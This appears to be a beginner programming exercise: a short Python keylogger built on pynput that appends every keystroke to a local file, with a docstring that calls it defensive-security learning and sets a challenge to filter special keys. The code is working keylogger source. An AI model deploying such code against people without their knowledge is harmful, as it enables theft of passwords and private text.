from pynput import keyboard   

def on_press(key):
    try:
        with open("keylog.txt", "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        with open("keylog.txt", "a") as f:
            f.write(f" {key} ")

# Start keylogger
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()



'''
A keylogger captures user keystrokes and stores them in a log file.
Keyloggers are often used by malware, so learning about them helps in defensive security.


Algorithm:
Capture keystrokes in real-time.
Store them in a log file named keylog.txt
Run in the background and capture all keystrokes.

Challenge:
Add a feature to filter out the special keys like Enter, Shift, Ctrl, etc.

'''